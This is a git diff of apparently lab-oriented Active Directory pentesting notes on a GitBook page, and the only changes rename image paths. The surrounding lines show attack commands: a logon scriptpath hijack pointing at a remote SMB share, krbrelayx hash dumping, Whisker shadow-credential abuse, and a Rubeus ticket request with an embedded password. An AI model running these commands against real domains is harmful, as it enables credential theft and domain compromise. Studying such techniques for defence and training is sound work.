@@ -679,7 +679,7 @@ Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\sha
 
 <summary>Exploiting GenericWrite on Computer Object</summary>
 
-![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Enumerating permissions assigned to current user
   *   ```powershell
@@ -810,7 +810,7 @@ nslookup appsrv01
     * OR Krbrelayx attack on unconstrained delegation
       *
 
-          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
       * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
@@ -919,7 +919,7 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -1172,7 +1172,7 @@ setspn -T corp2.com -Q MSSQLSvc/*
 
 *   Login to the rdc01.corp1.com mssql server
 
-    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 *   Enumeration for [linked sql servers](../services/1433-mssql.md#linked-sql-servers)
@@ -1206,7 +1206,7 @@ setspn -T corp2.com -Q MSSQLSvc/*
 
 <summary>Exploiting AddKeyCredentialLink</summary>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)
 
@@ -1214,13 +1214,13 @@ Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whis
 Whisker.exe add /target:ZPH-SVRMGMT1$
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ… /password:"zCixoq4fEBQBRvvE" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show /ptt
 klist
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 </details>
